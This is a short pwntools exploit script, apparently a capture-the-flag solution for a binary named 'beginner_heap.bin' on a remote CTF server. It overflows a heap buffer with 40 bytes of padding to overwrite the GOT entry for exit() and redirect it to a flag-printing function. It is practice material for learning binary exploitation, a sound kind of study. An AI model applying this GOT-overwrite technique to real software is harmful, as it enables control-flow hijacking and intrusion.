from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3016)
e = ELF('./beginner_heap.bin')

exit = e.got['exit']
flag = 0x400826

payload = ''
payload += "A"*40
payload += p64(exit)

r.sendline(payload)
r.sendline(p64(flag))
log.info("Flag is: "+r.recv(1024))
